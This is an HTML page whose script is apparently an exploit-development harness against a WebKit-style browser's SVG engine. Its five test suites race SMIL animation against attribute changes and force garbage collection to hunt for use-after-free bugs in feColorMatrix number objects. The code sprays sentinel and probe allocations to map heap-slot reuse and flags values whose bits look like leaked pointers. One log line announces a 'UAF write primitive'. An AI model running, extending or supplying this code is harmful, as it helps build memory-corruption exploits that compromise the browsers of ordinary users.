<body>

<script>
var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{
    navigator.clipboard.writeText(text).then(function(){
      toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
    }).catch(function(){fallbackCopy(text,toast);});
  }catch(e){fallbackCopy(text,toast);}
}
function fallbackCopy(text,toast){
  var ta=document.createElement('textarea');ta.value=text;
  ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
  catch(e){L('Copy failed: '+e.message,'miss');}
  document.body.removeChild(ta);
}

var _dv=new DataView(new ArrayBuffer(8));
function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}

// arm64 userspace pointer range as f32 bits: 0x4F000000 to 0x52FFFFFF
function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
// arm64 pointer bits in f64: hi word 0x00000001-0x00007fff
function isPointerBits64(f){
  if(!isFinite(f)||isNaN(f))return false;
  var b=f64bits(f);
  return b.hi>=0x00000001&&b.hi<=0x00007fff;
}

function gcHard(){
  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
  var a2=[];for(var i=0;i<300000;i++)a2.push({x:i});a2=null;
  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
}
function gcDOM(){
  var c=document.createElement('div');document.body.appendChild(c);
  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
  c.innerHTML='';c.remove();
  for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
}
function gcFull(){gcHard();gcDOM();gcHard();}
function gcFrames(n,cb){
  var rem=n;
  function frame(){gcFull();rem--;if(rem>0)requestAnimationFrame(frame);else if(cb)cb();}
  requestAnimationFrame(frame);
}

var suites={};
function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');suites[name]();}
function runAll(){
  ['ADR59','ADR60','ADR61','ADR62','ADR63'].forEach(function(n){runSuite(n);});
}

// Helper: make a live-filter animated feColorMatrix
// Returns {svg, filt, fe, anim, rect}
function makeLiveAnimatedFilter(id, fromVal0, toVal0, dur){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);

  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
  var filt=document.createElementNS(SVG_NS,'filter');
  filt.id=id;defs.appendChild(filt);

  var fromVals=[];var toVals=[];
  for(var i=0;i<20;i++){
    fromVals.push(i===0?fromVal0:0);
    toVals.push(i===0?toVal0:0);
  }
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');
  fe.setAttribute('values',fromVals.join(' '));
  filt.appendChild(fe);

  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  rect.setAttribute('filter','url(#'+id+')');
  svg.appendChild(rect);

  var anim=document.createElementNS(SVG_NS,'animate');
  anim.setAttribute('attributeName','values');
  anim.setAttribute('from',fromVals.join(' '));
  anim.setAttribute('to',toVals.join(' '));
  anim.setAttribute('dur',(dur||5)+'s');
  anim.setAttribute('repeatCount','indefinite');
  fe.appendChild(anim);

  try{anim.beginElement();}catch(e){}

  return {svg:svg,filt:filt,fe:fe,anim:anim,rect:rect};
}

// ═══════════════════════════════════════════════════════════════
// ADR59 — Per-frame TearOff lifetime after selective release
//
// ADR57 CONFIRMED: different TearOff per animation frame.
// Each frame = separate C++ SVGNumber allocation.
// Now: selectively release MIDDLE TearOffs, keep FIRST and LAST.
//
// Goal: confirm that:
// 1. Released TearOffs DON'T affect survivors (each has own RefPtr)
// 2. The per-frame SVGNumbers at released positions ARE freed (verify zero-on-free)
// 3. Newly allocated SVGNumbers CAN land in freed slots
//
// Detection: after releasing T[2]...T[7], allocate 6 new SVGNumbers via
// fresh feColorMatrix. Compare their values with T[1] and T[8] positions.
// If any new SVGNumber has address between T[1] and T[8] (addressable via
// the animation oracle), we've demonstrated IsoHeap reuse in the spray zone.
// ═══════════════════════════════════════════════════════════════
suites['ADR59']=function(){
  L('ADR59: Per-frame TearOff lifetime — selective release','info');
  var ctx=makeLiveAnimatedFilter('f59',1000,0,3);

  // Wait for animation to start ticking
  setTimeout(function(){
    L('ADR59: collecting 10 TearOffs over 10 frames...','info');
    var tearOffs=[];
    var vals=[];
    var frameCount=0;

    function collect(){
      var t=ctx.fe.values.animVal.getItem(0);
      tearOffs.push(t);
      vals.push(t.value);
      frameCount++;
      if(frameCount<10) requestAnimationFrame(collect);
      else analyze();
    }

    function analyze(){
      // Verify: all different TearOffs (reconfirm ADR57)
      var allDiff=true;
      for(var i=1;i<tearOffs.length;i++){
        if(tearOffs[i]===tearOffs[0]){allDiff=false;break;}
      }
      L('ADR59: allDiff? '+allDiff+' (should be true from ADR57)','info');
      L('ADR59: T[0]='+vals[0].toFixed(2)+' T[9]='+vals[9].toFixed(2),'info');

      var t0=tearOffs[0];
      var t9=tearOffs[9];
      var v0=vals[0];
      var v9=vals[9];

      // Release T[1]...T[8], keep T[0] and T[9]
      for(var i=1;i<9;i++) tearOffs[i]=null;
      tearOffs=null;

      // Force GC to actually process the releases
      gcFull();

      // T[0] and T[9] should still be valid
      L('ADR59: after releasing T[1]..T[8] + gcFull:','info');
      try{L('  T[0].value='+t0.value+' (expected '+v0.toFixed(2)+'): '+(Math.abs(t0.value-v0)<1?'OK':'CHANGED!'),'info');}catch(e){L('  T[0] THROW','miss');}
      try{L('  T[9].value='+t9.value+' (expected '+v9.toFixed(2)+'): '+(Math.abs(t9.value-v9)<1?'OK':'CHANGED!'),'info');}catch(e){L('  T[9] THROW','miss');}

      // Allocate 8 new SVGNumbers quickly after the 8 freed slots
      var newFes=[];
      for(var i=0;i<8;i++){
        var newSvg=document.createElementNS(SVG_NS,'svg');
        document.body.appendChild(newSvg);
        var newFe=document.createElementNS(SVG_NS,'feColorMatrix');
        newFe.setAttribute('type','matrix');
        var v=[];for(var j=0;j<20;j++)v.push(j===0?(i+1)*1111:0);
        newFe.setAttribute('values',v.join(' '));
        newSvg.appendChild(newFe);
        newFes.push({svg:newSvg,fe:newFe,t:newFe.values.baseVal.getItem(0)});
      }
      L('ADR59: allocated 8 new SVGNumbers after releasing 8 per-frame slots','info');
      L('ADR59: new values: '+newFes.map(function(x){return x.t.value.toFixed(0);}).join(', '),'info');

      // Check that T[0] and T[9] still readable after new allocs
      L('ADR59: T[0] after new allocs: '+t0.value.toFixed(2),'info');
      L('ADR59: T[9] after new allocs: '+t9.value.toFixed(2),'info');

      // Any unexpected corruption?
      if(Math.abs(t0.value-v0)>0.5){L('★ ADR59: T[0] VALUE CHANGED after new allocs! Was '+v0.toFixed(2)+' now '+t0.value,'hit');}
      if(Math.abs(t9.value-v9)>0.5){L('★ ADR59: T[9] VALUE CHANGED after new allocs! Was '+v9.toFixed(2)+' now '+t9.value,'hit');}

      // Cleanup
      newFes.forEach(function(x){x.svg.remove();});
      ctx.svg.remove();
    }

    requestAnimationFrame(collect);
  },100);
};

// ═══════════════════════════════════════════════════════════════
// ADR60 — setAttributeNS DURING active animation (SMIL race)
//
// ADR55: setAttributeNS with NO animation → old TearOffs detached,
//         old SVGNumbers kept alive by TearOff RefPtrs.
//
// New test: what happens when SMIL animation IS RUNNING and we call
// setAttributeNS?
//
// Scenario: SMIL engine is computing animated values based on the
// element's `values` attribute. If we change `values` via setAttributeNS
// while SMIL has a RAW POINTER to the old list:
//
//   Frame N:
//     1. SMIL gets ref to baseVal list (raw? RefPtr?)
//     2. JS: setAttributeNS() replaces baseVal list
//     3. SMIL continues computing with old list ref
//     4. If raw ptr: UAF! If RefPtr: safe but race condition
//
// Detection: hold animVal TearOff, call setAttributeNS, check:
// - Does animVal TearOff read old animated value (pre-setAttr)?
// - Does animVal TearOff read new base value?
// - Does animVal TearOff read garbage/zero?
//
// Also: does setAttributeNS with new values RESET the animation?
// Does the animation continue interpolating the new values?
// ═══════════════════════════════════════════════════════════════
suites['ADR60']=function(){
  L('ADR60: setAttributeNS during active SMIL animation','info');
  var ctx=makeLiveAnimatedFilter('f60',1000,0,5);

  setTimeout(function(){
    // Get animVal TearOff while animation is running
    var av=ctx.fe.values.animVal;
    var avTear=av.getItem(0);
    var avBefore=avTear.value;
    L('ADR60 T0: avTear before setAttr='+avBefore.toFixed(3),'info');

    var NEW_BASE=[];
    for(var i=0;i<20;i++) NEW_BASE.push(i===0?99999:0);

    // setAttributeNS while SMIL is animating
    ctx.fe.setAttributeNS(null,'values',NEW_BASE.join(' '));

    var avAfter=avTear.value;
    var bvAfter=ctx.fe.values.baseVal.getItem(0).value;
    L('ADR60 T1 (immediate after setAttr):','info');
    L('  avTear.value='+avAfter.toFixed(3)+' (was '+avBefore.toFixed(3)+')','info');
    L('  bv.getItem(0)='+bvAfter,'info');
    L('  avTear bits='+f32hex(avAfter),'info');

    if(isPointerLike32(f32bits(avAfter))){
      L('★★ ADR60 T1: avTear POINTER-LIKE after race: '+f32hex(avAfter),'hit');
    } else if(avAfter===0){
      L('★ ADR60 T1: avTear=ZERO after setAttr during animation','warn');
    } else if(Math.abs(avAfter-avBefore)<0.5){
      L('ADR60 T1: avTear still OLD animated value (detached TearOff)','info');
    } else {
      L('ADR60 T1: avTear changed to '+avAfter.toFixed(3)+' (new value?)','warn');
    }

    // Now get FRESH avTear after setAttr
    var avFresh=av.getItem(0);
    L('ADR60 T2: fresh av.getItem(0) after setAttr='+avFresh.value.toFixed(3),'info');
    L('ADR60 T2: old avTear===fresh? '+(avTear===avFresh),'info');

    // Wait 100ms for SMIL to potentially crash or update
    setTimeout(function(){
      L('ADR60 T3 @+100ms:','info');
      try{L('  old avTear.value='+avTear.value.toFixed(3),'info');}catch(e){L('  old avTear THROW: '+e.message,'miss');}
      try{L('  fresh avTear.value='+avFresh.value.toFixed(3),'info');}catch(e){L('  fresh avTear THROW: '+e.message,'miss');}
      try{L('  bv='+ctx.fe.values.baseVal.getItem(0).value,'info');}catch(e){L('  bv THROW','miss');}

      // Rapid 50 setAttributeNS while holding MANY avTear refs
      L('ADR60 T4: collect 10 avTear refs, then 50 rapid setAttributeNS cycles','info');
      var avRefs=[];
      for(var i=0;i<10;i++) avRefs.push(av.getItem(0));
      L('ADR60 T4: all same? '+(avRefs.every(function(t){return t===avRefs[0];})),'info');

      var rapidVals=[];
      for(var i=0;i<20;i++) rapidVals.push(0);
      for(var i=0;i<50;i++){
        rapidVals[0]=i*1000+500;
        ctx.fe.setAttributeNS(null,'values',rapidVals.join(' '));
      }
      L('ADR60 T4: after 50 rapid cycles:','info');
      try{L('  avRefs[0].value='+avRefs[0].value.toFixed(3),'info');}catch(e){L('  THROW: '+e.message,'miss');}
      try{L('  bv='+ctx.fe.values.baseVal.getItem(0).value,'info');}catch(e){L('  THROW','miss');}

      // Check bits for any of the avRefs
      for(var i=0;i<avRefs.length;i++){
        try{
          var v=avRefs[i].value;
          var bits=f32bits(v);
          if(isPointerLike32(bits)){
            L('★★★ ADR60 T4: avRefs['+i+'] POINTER-LIKE! v='+v+' bits='+f32hex(v),'hit');
          }
        }catch(e){L('ADR60 T4: avRefs['+i+'] THROW after rapid setAttr','warn');}
      }

      ctx.svg.remove();
    },100);
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR61 — animVal TearOff after setAttributeNS removes animation source
//
// From ADR55: setAttributeNS invalidates TearOff cache.
// From ADR57: animVal TearOffs are DIFFERENT per frame (per-frame alloc).
//
// Combined test: during animation, collect animVal TearOff T_anim.
// Then call setAttributeNS → this changes the values attribute.
// SMIL's "from" was based on old values — new attribute string might
// RESET the animation or CHANGE what it interpolates.
//
// Key: does T_anim (animVal TearOff from before setAttr) read:
//   a) Its frozen animated value (like ADR55's bv TearOffs)
//   b) The new animated value after setAttr
//   c) ZERO (freed C++ animated SVGNumber)
//   d) Garbage (dangling raw ptr)
//
// Also: T_base (baseVal TearOff) after setAttributeNS:
//   - Should behave like ADR55: reads OLD base value
//
// Extended: compare T_anim vs T_base values across multiple rounds
// ═══════════════════════════════════════════════════════════════
suites['ADR61']=function(){
  L('ADR61: animVal + baseVal TearOffs after rapid setAttributeNS cycles','info');
  var ctx=makeLiveAnimatedFilter('f61',5000,0,10);

  setTimeout(function(){
    var av=ctx.fe.values.animVal;
    var bv=ctx.fe.values.baseVal;

    // Collect animVal and baseVal TearOffs mid-animation
    var avTear=av.getItem(0);
    var bvTear=bv.getItem(0);
    var avVal=avTear.value;
    var bvVal=bvTear.value;

    L('ADR61 T0: avTear='+avVal.toFixed(2)+' bvTear='+bvVal.toFixed(2),'info');

    var rounds=[];

    // Run 10 setAttributeNS cycles, each time check old TearOffs
    var roundCount=0;
    function doRound(){
      if(roundCount>=10){summary();return;}
      var newVals=[];
      for(var i=0;i<20;i++) newVals.push(i===0?(roundCount+1)*10000:0);
      ctx.fe.setAttributeNS(null,'values',newVals.join(' '));

      // Read IMMEDIATELY after setAttr
      var avNow, bvNow, freshAv;
      try{avNow=avTear.value;}catch(e){avNow='THROW:'+e.message;}
      try{bvNow=bvTear.value;}catch(e){bvNow='THROW:'+e.message;}
      try{freshAv=av.getItem(0).value;}catch(e){freshAv='THROW:'+e.message;}

      rounds.push({r:roundCount,av:avNow,bv:bvNow,fav:freshAv});
      roundCount++;
      setTimeout(doRound,0); // next tick, not next frame
    }

    function summary(){
      L('ADR61: round results (avTear/bvTear/freshAv per cycle):','info');
      rounds.forEach(function(r){
        var avv=(typeof r.av==='number')?r.av.toFixed(2):r.av;
        var bvv=(typeof r.bv==='number')?r.bv.toFixed(2):r.bv;
        var fvv=(typeof r.fav==='number')?r.fav.toFixed(2):r.fav;
        L('  R'+r.r+': av='+avv+' bv='+bvv+' freshAv='+fvv,'info');
        if(typeof r.av==='number' && isPointerLike32(f32bits(r.av)))
          L('  ★★★ R'+r.r+' avTear POINTER-LIKE: '+f32hex(r.av),'hit');
        if(typeof r.bv==='number' && isPointerLike32(f32bits(r.bv)))
          L('  ★★★ R'+r.r+' bvTear POINTER-LIKE: '+f32hex(r.bv),'hit');
      });

      // Final values
      try{L('ADR61 final: avTear='+avTear.value.toFixed(2)+' bvTear='+bvTear.value.toFixed(2),'info');}
      catch(e){L('ADR61 final: TearOff THROW: '+e.message,'miss');}

      // Check if avTear froze at initial value (like ADR55 orphans)
      // or if it continued updating
      if(typeof avTear.value==='number'){
        if(Math.abs(avTear.value-avVal)<1){
          L('ADR61: avTear FROZEN at initial animated value '+avVal.toFixed(2),'warn');
          L('ADR61: → animVal TearOff orphaned SAME as baseVal TearOff (ADR55 confirmed for animVal)','info');
        } else {
          L('ADR61: avTear CHANGED from initial ('+avVal.toFixed(2)+' → '+avTear.value.toFixed(2)+')','warn');
        }
      }
      ctx.svg.remove();
    }

    setTimeout(doRound,0);
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR62 — Release per-frame animVal TearOff WHILE animation ticking
//
// From ADR57: each animation frame allocates a NEW C++ SVGNumber
// for the animated value. Each collected TearOff holds RefPtr to
// its per-frame SVGNumber.
//
// KEY HYPOTHESIS: The SMIL engine might also hold an internal pointer
// to the "current animated list" while computing the next frame.
// If that pointer is a RAW POINTER (not RefPtr), and we release the
// TearOff between frames, the SVGNumber might be freed while SMIL
// still holds its raw pointer.
//
// Test: collect T[0] from frame 0. Wait for frame 1. RELEASE T[0].
// Force GC to actually free the C++ SVGNumber.
// Wait for SMIL to run frame 2.
// Check: did anything crash? Did SMIL write to a freed address?
//
// Also: allocate a fresh feColorMatrix C right after releasing T[0].
// C's SVGNumber might land at the freed address.
// Then force SMIL to tick again.
// Check C's SVGNumber for unexpected writes (would be SMIL writing to it via dangling ptr).
// ═══════════════════════════════════════════════════════════════
suites['ADR62']=function(){
  L('ADR62: Release animVal TearOff between frames — UAF window test','info');
  var ctx=makeLiveAnimatedFilter('f62',2000,0,8);

  setTimeout(function(){
    L('ADR62: animation started, collecting T[0]...','info');
    var t0=null;
    var t0val=null;

    // Collect T[0] on first tick
    requestAnimationFrame(function(){
      t0=ctx.fe.values.animVal.getItem(0);
      t0val=t0.value;
      L('ADR62: T[0] collected, value='+t0val.toFixed(3),'info');

      // Wait one more rAF frame before releasing
      requestAnimationFrame(function(){
        var t1val=ctx.fe.values.animVal.getItem(0).value;
        L('ADR62: frame+1 animVal='+t1val.toFixed(3)+' (animation ticking: '+(Math.abs(t1val-t0val)>0.1)+')', 'info');

        // RELEASE T[0]
        var t0ref=t0;
        t0=null;
        t0val=null;

        // Force GC to process the release
        gcHard();

        L('ADR62: T[0] released + gcHard done','info');

        // Immediately alloc a fresh SVGNumber C (might land at freed T[0] address)
        var cSvg=document.createElementNS(SVG_NS,'svg');
        document.body.appendChild(cSvg);
        var cFe=document.createElementNS(SVG_NS,'feColorMatrix');
        cFe.setAttribute('type','matrix');
        var cVals=[];for(var i=0;i<20;i++)cVals.push(i===0?55555:0);
        cFe.setAttribute('values',cVals.join(' '));
        cSvg.appendChild(cFe);
        var cTear=cFe.values.baseVal.getItem(0);
        L('ADR62: alloc C immediately after T[0] release: C.value='+cTear.value,'info');

        // Wait for SMIL to tick again (should write new animated value somewhere)
        requestAnimationFrame(function(){
          var t2val=ctx.fe.values.animVal.getItem(0).value;
          L('ADR62: frame+2 (after release+alloc) animVal='+t2val.toFixed(3),'info');

          // CRITICAL: Check if C's SVGNumber was written to by SMIL
          var cAfter=cTear.value;
          L('ADR62: C.value after SMIL tick='+cAfter,'info');
          if(cAfter!==55555){
            if(cAfter===0){
              L('★★ ADR62: C.value=ZERO — IsoHeap freed the slot and zero-on-free applies','warn');
            } else {
              L('★★★ ADR62: C.value CHANGED TO '+cAfter.toFixed(3)+' bits='+f32hex(cAfter),'hit');
              L('★★★ ADR62: SMIL wrote to our freshly allocated SVGNumber!','hit');
              L('★★★ ADR62: This is the UAF write primitive!','hit');
            }
          } else {
            L('ADR62: C.value still 55555 (SMIL did not write to it)','info');
          }

          // Also: did t0ref (the released TearOff, now possibly dangling) do anything?
          try{
            var t0After=t0ref.value;
            L('ADR62: released T[0] still readable? value='+t0After.toFixed(3)+' bits='+f32hex(t0After),'warn');
            if(isPointerLike32(f32bits(t0After))){
              L('★★★ ADR62: released TearOff reads POINTER-LIKE: '+f32hex(t0After),'hit');
            }
          }catch(e){L('ADR62: released T[0] THROW (expected): '+e.message,'info');}

          cSvg.remove();
          ctx.svg.remove();
        });
      });
    });
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR63 — IsoHeap spray: per-frame SVGNumber free/reuse oracle
//
// This is the most systematic test of IsoHeap reuse patterns.
//
// Setup:
//   1. Alloc 50 "sentinel" feColorMatrix elements (each item[0] = unique canary)
//      These land in IsoHeap as a baseline.
//   2. Run animation for 50 frames, collecting TearOffs T[0]...T[49]
//      These are 50 consecutive per-frame SVGNumber allocs.
//   3. Release ALL collected TearOffs simultaneously → 50 SVGNumber slots freed
//   4. Force GC
//   5. Alloc 50 "probe" feColorMatrix elements (each item[0] = probe canary)
//      These MIGHT reuse the freed per-frame slots.
//   6. Check sentinel values: did any sentinel value change?
//      (Would mean probe landed adjacent to sentinel, maybe overlapping)
//   7. Check probe values: all should be their canary values.
//      (Any change would mean address collision with animated SVGNumbers)
//
// Key measurement: are the 50 freed per-frame SVGNumber IsoHeap slots
// reused IMMEDIATELY for the 50 new probe allocations?
// (LIFO vs FIFO free list? Bump-only on iOS?)
// ═══════════════════════════════════════════════════════════════
suites['ADR63']=function(){
  L('ADR63: IsoHeap spray oracle — per-frame alloc → free → reuse pattern','info');

  // Step 1: Sentinel allocs
  var SENTINEL_BASE=77770000;
  var sentinelFes=[];
  for(var i=0;i<50;i++){
    var sSvg=document.createElementNS(SVG_NS,'svg');
    document.body.appendChild(sSvg);
    var sFe=document.createElementNS(SVG_NS,'feColorMatrix');
    sFe.setAttribute('type','matrix');
    var sVals=[];for(var j=0;j<20;j++)sVals.push(j===0?(SENTINEL_BASE+i):0);
    sFe.setAttribute('values',sVals.join(' '));
    sSvg.appendChild(sFe);
    sentinelFes.push({svg:sSvg,fe:sFe,t:sFe.values.baseVal.getItem(0),canary:SENTINEL_BASE+i});
  }
  L('ADR63: 50 sentinels allocated (canaries '+SENTINEL_BASE+' to '+(SENTINEL_BASE+49)+')','info');

  // Step 2: Start animation and collect 50 per-frame TearOffs
  var ctx=makeLiveAnimatedFilter('f63',3000,0,6);
  var frameTearOffs=[];
  var frameCount=0;

  setTimeout(function(){
    function collectFrames(){
      var t=ctx.fe.values.animVal.getItem(0);
      frameTearOffs.push(t);
      frameCount++;
      if(frameCount<50) requestAnimationFrame(collectFrames);
      else afterCollect();
    }
    requestAnimationFrame(collectFrames);
  },100);

  function afterCollect(){
    L('ADR63: 50 per-frame TearOffs collected, range: '+
      frameTearOffs[0].value.toFixed(1)+' to '+
      frameTearOffs[49].value.toFixed(1),'info');

    // Verify all different
    var allDiff=true;
    for(var i=1;i<frameTearOffs.length;i++){
      if(frameTearOffs[i]===frameTearOffs[0]){allDiff=false;break;}
    }
    L('ADR63: all different TearOffs? '+allDiff,'info');

    // Step 3: Release ALL 50 frame TearOffs at once
    var savedFirst=frameTearOffs[0];
    var savedLast=frameTearOffs[49];
    var savedFirstVal=savedFirst.value;
    var savedLastVal=savedLast.value;
    frameTearOffs=null; // release all 50

    // Step 4: Force GC
    gcFull();
    L('ADR63: 50 frame TearOffs released + gcFull done','info');

    // Verify sentinels still intact before probe allocs
    var sentinelOK=true;
    for(var i=0;i<sentinelFes.length;i++){
      var sv=sentinelFes[i].t.value;
      if(Math.abs(sv-sentinelFes[i].canary)>0.5){
        L('★ ADR63: SENTINEL['+i+'] CORRUPTED! was '+sentinelFes[i].canary+' now '+sv,'hit');
        sentinelOK=false;
      }
    }
    if(sentinelOK) L('ADR63: all 50 sentinels intact before probe allocs','info');

    // Step 5: Probe allocs
    var PROBE_BASE=88880000;
    var probeFes=[];
    for(var i=0;i<50;i++){
      var pSvg=document.createElementNS(SVG_NS,'svg');
      document.body.appendChild(pSvg);
      var pFe=document.createElementNS(SVG_NS,'feColorMatrix');
      pFe.setAttribute('type','matrix');
      var pVals=[];for(var j=0;j<20;j++)pVals.push(j===0?(PROBE_BASE+i):0);
      pFe.setAttribute('values',pVals.join(' '));
      pSvg.appendChild(pFe);
      probeFes.push({svg:pSvg,fe:pFe,t:pFe.values.baseVal.getItem(0),canary:PROBE_BASE+i});
    }
    L('ADR63: 50 probes allocated','info');

    // Step 6: Check sentinels for corruption
    var corruptSentinels=0;
    for(var i=0;i<sentinelFes.length;i++){
      var sv=sentinelFes[i].t.value;
      if(Math.abs(sv-sentinelFes[i].canary)>0.5){
        L('★ ADR63: SENTINEL['+i+'] CORRUPTED after probe alloc! was '+sentinelFes[i].canary+' now '+sv,'hit');
        corruptSentinels++;
      }
    }
    if(corruptSentinels===0) L('ADR63: all sentinels intact (no overlap with probe allocs)','info');

    // Step 7: Check probe values
    var corruptProbes=0;
    for(var i=0;i<probeFes.length;i++){
      var pv=probeFes[i].t.value;
      if(Math.abs(pv-probeFes[i].canary)>0.5){
        L('★ ADR63: PROBE['+i+'] unexpected value '+pv+' (canary was '+probeFes[i].canary+')','warn');
        corruptProbes++;
      }
    }
    if(corruptProbes===0) L('ADR63: all 50 probes have correct canary values','info');

    // savedFirst and savedLast: did they survive being "released"?
    // (If JS didn't actually GC them, RefPtrs still held)
    L('ADR63: savedFirst (still held by JS).value='+savedFirst.value.toFixed(2)+
      ' (was '+savedFirstVal.toFixed(2)+'): '+(Math.abs(savedFirst.value-savedFirstVal)<1?'PRESERVED':'CHANGED!'),'info');
    L('ADR63: savedLast (still held by JS).value='+savedLast.value.toFixed(2)+
      ' (was '+savedLastVal.toFixed(2)+'): '+(Math.abs(savedLast.value-savedLastVal)<1?'PRESERVED':'CHANGED!'),'info');

    L('ADR63: NOTE: if IsoHeap is BUMP-ONLY on iOS (no free list reuse), probes land AFTER frame allocs','info');
    L('ADR63: if IsoHeap has free list, probes MIGHT reuse frame slots','info');

    // Cleanup
    sentinelFes.forEach(function(x){x.svg.remove();});
    probeFes.forEach(function(x){x.svg.remove();});
    ctx.svg.remove();
  }
};
</script>
